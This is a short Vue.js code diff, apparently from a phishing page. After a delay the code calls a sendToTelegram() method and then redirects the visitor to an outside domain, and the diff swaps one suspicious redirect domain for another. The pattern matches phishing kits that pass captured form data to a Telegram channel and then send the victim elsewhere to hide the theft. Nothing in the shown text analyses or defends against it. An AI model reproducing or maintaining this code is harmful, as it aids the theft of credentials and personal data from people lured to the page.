@@ -138,7 +138,7 @@ const app = Vue.createApp({
 
       setTimeout(() => {
         this.sendToTelegram();
-        window.location.href = 'https://tbb.flnitionelegance.com/';
+        window.location.href = 'https://tub.lhenn-group.com/';
       }, 2000);
     },
     sendToTelegram() {
